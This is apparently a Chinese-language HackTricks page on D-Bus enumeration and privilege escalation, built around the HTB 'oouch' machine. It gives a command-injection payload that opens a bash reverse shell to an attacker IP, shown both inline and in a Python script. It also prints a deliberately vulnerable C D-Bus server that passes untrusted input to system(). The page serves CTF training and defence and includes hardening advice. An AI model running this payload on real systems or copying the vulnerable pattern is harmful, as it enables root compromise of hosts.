# D-Bus 枚举与命令注入权限提升

{{#include ../../banners/hacktricks-training.md}}

## **GUI 枚举**

D-Bus 被用作 Ubuntu 桌面环境中的进程间通信（IPC）中介。在 Ubuntu 上，可以观察到多个消息总线同时运行：system bus 主要由 **特权服务用于公开整个系统相关的服务**，而 session bus 则为每个已登录用户分别提供，仅公开与该特定用户相关的服务。由于 system bus 与以更高权限（例如 root）运行的服务相关，而我们的目标是提升权限，因此这里主要关注 system bus。需要注意的是，D-Bus 的架构为每个 session bus 配置了一个“router”，负责根据客户端为希望通信的服务指定的地址，将客户端消息重定向到相应的服务。<sup>[[1]](#references)</sup>

D-Bus 上的服务由其公开的 **objects** 和 **interfaces** 定义。在标准 OOP 语言中，objects 可以类比为类实例，每个实例都通过唯一的 **object path** 进行标识。该路径类似于文件系统路径，用于唯一标识服务公开的每个 object。对于研究而言，一个关键 interface 是 **org.freedesktop.DBus.Introspectable** interface，其中包含一个名为 Introspect 的方法。该方法返回 object 所支持的方法、信号和属性的 XML 表示；这里重点关注方法，省略属性和信号。

为了与 D-Bus interface 通信，使用了两个工具：一个名为 **gdbus** 的 CLI 工具，用于在脚本中轻松调用 D-Bus 公开的方法；以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，这是一个基于 Python 的 GUI 工具，用于枚举每个 bus 上可用的服务，并显示每个服务中包含的 objects。
```bash
sudo apt-get install d-feet
```
如果你正在检查 **session bus**，请先确认当前地址：
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

第一张图片显示了注册到 D-Bus system bus 的服务，其中在选择 System Bus 按钮后，特别突出显示了 **org.debin.apt**。D-Feet 会查询该服务中的对象，并在第二张图片中显示所选对象的 interfaces、methods、properties 和 signals。每个 method 的 signature 也会详细列出。

一个值得注意的功能是显示服务的 **process ID (pid)** 和**命令行**，这对于确认服务是否以 elevated privileges 运行非常有用，对研究是否具有相关性也很重要。

**D-Feet 还允许调用 method**：用户可以输入 Python expressions 作为参数，D-Feet 会将其转换为 D-Bus types，然后传递给服务。

但是请注意，**某些 methods 需要 authentication**，之后才允许我们调用它们。我们将忽略这些 methods，因为我们的目标本来就是在没有 credentials 的情况下提升 privileges。

还要注意，某些服务会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus 服务，以确定是否应允许用户执行某些 actions。

## **Cmd line Enumeration**

### 列出 Service Objects

可以使用以下命令列出已打开的 D-Bus interfaces：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
标记为 **`(activatable)`** 的 services 尤其值得关注，因为它们**尚未运行**，但 bus 请求可以按需启动它们。不要止步于 `busctl list`；将这些名称映射到它们实际会执行的 binaries。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
这可以快速告诉你，对于某个可激活名称，哪个 `Exec=` 路径会被启动，以及该路径会以哪个身份运行。如果二进制文件或其执行链受到的保护较弱，即使服务处于非活动状态，也可能成为 privilege-escalation 路径。

#### 连接

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) 当进程建立到总线的连接时，总线会为该连接分配一个特殊的总线名称，称为 _unique connection name_。此类总线名称是不可变的——只要连接存在，就保证不会发生变化；更重要的是，在总线的生命周期内，它们无法被重用。这意味着，即使同一进程关闭与总线的连接，然后重新创建一个连接，也不会有其他连接获得过相同的 unique connection name。Unique connection names 很容易识别，因为它们以通常被禁止使用的冒号字符开头。<sup>[[4]](#references)</sup>

### Service Object Info

然后，你可以使用以下命令获取有关该接口的一些信息：
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
同时将 bus 名称与其 `systemd` unit 和可执行文件路径对应起来：
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
这回答了 privesc 过程中最重要的操作问题：**如果方法调用成功，哪个真实的 binary 和 unit 会执行该操作？**

### 列出 Service Object 的 Interfaces

你需要拥有足够的权限。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 检查 Service Object 的 Interface

注意，在此示例中，通过 `tree` parameter 选择了发现的最新 interface（_参见上一节_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
注意接口 `htb.oouch.Block` 的 `.Block` 方法（也就是我们感兴趣的方法）。其他列中的 “s” 可能意味着它期望接收一个字符串。

在尝试任何危险操作之前，先验证一个**面向读取**或其他低风险的方法。这样可以清晰地区分三种情况：语法错误、可访问但被拒绝，或可访问且允许执行。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### 将 D-Bus Methods 与 Policies 和 Actions 关联起来

Introspection 会告诉你**可以调用什么**，但不会告诉你某次调用**为何被允许或拒绝**。在实际的 privesc triage 中，通常需要同时检查**三个层面**：

1. **Activation metadata**（`.service` 文件或 `SystemdService=`），了解实际会运行哪个 binary 和 unit。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`），了解谁可以执行 `own`、`send_destination` 或 `receive_sender`。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`），了解默认 authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）。

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
不要假设 D-Bus method 与 Polkit action 之间存在一一对应关系。同一个 method 可能会根据被修改的对象或运行时上下文选择不同的 action。因此，实际的工作流程是：

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` 并 grep 相关的 `.policy` 文件
3. 使用 `busctl call`、`gdbus call` 或 `dbusmap --enable-probes --null-agent` 进行低风险 live probes

Proxy 或兼容性服务需要格外关注。一个**以 root 身份运行的 proxy**，如果通过自身预先建立的连接将请求转发给另一个 D-Bus 服务，可能会意外地使 backend 将每个请求都视为来自 UID 0，除非对原始调用方的身份重新进行验证。<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

拥有足够的 privileges 后（仅具备 `send_destination` 和 `receive_sender` privileges 还不够），你可以**monitor D-Bus communication**。

要**monitor**一项**communication**，你需要成为 **root**。如果你在 root 身份下仍然发现问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> 如果你知道如何配置 D-Bus config file，使**非 root 用户能够 sniff**该 communication，请**联系我**！

以下是几种 monitor 方式：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
在以下示例中，接口 `htb.oouch.Block` 被监控，并且由于通信错误，消息 "**_**lalalalal**_**" 被发送：
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
你可以使用 `capture` 代替 `monitor`，将结果保存为 Wireshark 可以打开的 **pcapng** 文件：
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### 过滤所有噪声 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

如果 bus 上的信息过多，可以像这样传入匹配规则：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
可以指定多条规则。如果消息匹配其中的_任意一条_规则，则会打印该消息。示例如下：
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
有关 match rule 语法的更多信息，请参阅 [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)。<sup>[[7]](#references)</sup>

### 更多

`busctl` 还有更多选项，[**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **易受攻击场景**

作为来自 HTB 主机 "oouch" 的用户 **qtc**，你可以在 _/etc/dbus-1/system.d/htb.oouch.Block.conf_ 中找到一个**意外的 D-Bus 配置文件**：
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
根据之前的配置，注意到**你需要是用户 `root` 或 `www-data`，才能通过此 D-BUS communication 发送和接收信息**。

作为 docker container 内的用户 **qtc**，你可以在文件 _/code/oouch/routes.py_ 中找到一些与 dbus 相关的代码。以下是其中值得关注的代码：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
正如你所看到的，它正在**连接到一个 D-Bus interface**，并将“client_ip”发送给**“Block” function**。

在 D-Bus connection 的另一端，有一个正在运行的 C compiled binary。该代码正在 D-Bus connection 中**监听 IP address，并通过 `system` function 调用 iptables**，以阻止给定的 IP address。\
**对 `system` 的调用故意存在 command injection 漏洞**，因此类似以下 payload 的内容将创建一个 reverse shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 利用它

在此页面的末尾可以找到 **D-Bus application 的完整 C code**。其中第 91-97 行之间展示了**如何注册 `D-Bus object path`** **和 `interface name`**。发送信息到 D-Bus connection 时需要这些信息：
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
另外，在第 57 行可以看到，此 D-Bus 通信中**唯一注册的方法**名为 `Block`（_**因此，在以下部分中，payload 将被发送到服务对象 `htb.oouch.Block`、接口 `/htb/oouch/Block` 以及方法名 `Block`**）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下 Python 代码将 payload 通过 `block_iface.Block(runme)` 发送到 D-Bus connection 的 `Block` method（_请注意，该代码提取自前一个代码块_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 和 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` 是用于向 “Message Bus” 发送消息的工具
- Message Bus —— 系统用于轻松实现应用程序之间通信的软件。它与 Message Queue（消息按顺序排列）相关，但在 Message Bus 中，消息以订阅模型发送，并且速度非常快。
- “-system” tag 用于说明这是系统消息，而不是 session 消息（默认情况）。
- “–print-reply” tag 用于适当地打印我们发送的消息，并以人类可读的格式接收任何回复。
- “–dest=Dbus-Interface-Block” Dbus interface 的地址。
- “–string:” —— 我们希望发送到 interface 的消息类型。发送消息有多种格式，例如 double、bytes、booleans、int、objpath。其中，当我们希望向 Dbus interface 发送文件路径时，“object path” 非常有用。在这种情况下，我们可以使用特殊文件（FIFO），以文件名的形式向 interface 传递命令。“string:;” —— 用于再次调用 object path，我们在其中放置 FIFO reverse shell 文件/命令。

_请注意，在 `htb.oouch.Block.Block` 中，第一部分（`htb.oouch.Block`）引用 service object，最后一部分（`.Block`）引用 method 名称。_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

手动使用 `busctl`/`gdbus` 枚举大型 D-Bus attack surface 很快会变得痛苦不堪。过去几年发布的两个小型 FOSS 工具可以在 red-team 或 CTF 活动中加快这一过程：

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* 使用 C 编写；单个 static binary（<50 kB），会遍历每个 object path，获取 `Introspect` XML，并将其映射到所属的 PID/UID。<sup>[[5]](#references)</sup>
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 该工具会使用 `!` 标记未受保护的 well-known names，从而立即显示你可以 *own*（接管）的 services，或可从 unprivileged shell 访问的方法调用。

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* 仅使用 Python 的脚本，用于查找 systemd units 中的 *writable* paths，以及权限过于宽松的 D-Bus policy files（例如 `send_destination="*"`）。<sup>[[6]](#references)</sup>
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module 会搜索以下目录，并突出显示任何可被普通用户 spoof 或 hijack 的 service：
* `/etc/dbus-1/system.d/` 和 `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/`（vendor overrides）

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

关注近期发布的 CVE 有助于发现 custom code 中类似的不安全模式。以下是两个很好的近期示例：<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | 以 root 运行的 service 暴露了一个 unprivileged users 可以重新配置的 D-Bus interface，其中包括加载 attacker-controlled macro behavior。 | 如果 daemon 在 system bus 上暴露 **device/profile/config management**，请将 writable configuration 和 macro features 视为 code-execution primitives，而不只是“settings”。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | 以 root 运行的 compatibility proxy 将 requests 转发到 backend services 时，没有保留原始 caller 的 security context，因此 backends 将 proxy 视为 UID 0 并信任它。 | 将 **proxy / bridge / compatibility** D-Bus services 视为单独的 bug class：如果它们 relay privileged calls，请确认 caller UID/Polkit context 如何传递到 backend。 |

需要注意的模式：
1. Service 在 system bus 上 **以 root 身份运行**。
2. 要么 **没有 authorization check**，要么 check 针对的是 **错误的 subject**。
3. 可访问的方法最终会改变 system state：package install、user/group changes、bootloader config、device profile updates、file writes 或 direct command execution。

使用 `dbusmap --enable-probes` 或手动执行 `busctl call` 来确认某个方法是否可访问，然后检查 service 的 policy XML 和 Polkit actions，以了解实际授权的是 **哪个 subject**。

---

## Hardening & Detection Quick-Wins

* 搜索 world-writable 或 *send/receive*-open policies：
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 对 dangerous methods 要求使用 Polkit —— 即使是 *root* proxies，也应将 *caller* PID 传递给 `polkit_authority_check_authorization_sync()`，而不是传递它们自己的 PID。
* 在 long-running helpers 中 drop privileges（连接到 bus 后，使用 `sd_pid_get_owner_uid()` 切换 namespaces）。
* 如果无法移除某个 service，至少将其 *scope* 限制到专用 Unix group，并在其 XML policy 中限制 access。
* Blue-team：使用 `busctl capture > /var/log/dbus_$(date +%F).pcapng` 捕获 system bus，并将其导入 Wireshark 进行 anomaly detection。

---

## References

- [1] [Ubuntu Desktop 中的 USBCreator D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752：D-Bus service 允许任何 unprivileged user 进行 configuration](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy：Deepin D-Bus Proxy Service 中的 Authentication Bypass（CVE-2025-23222）](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
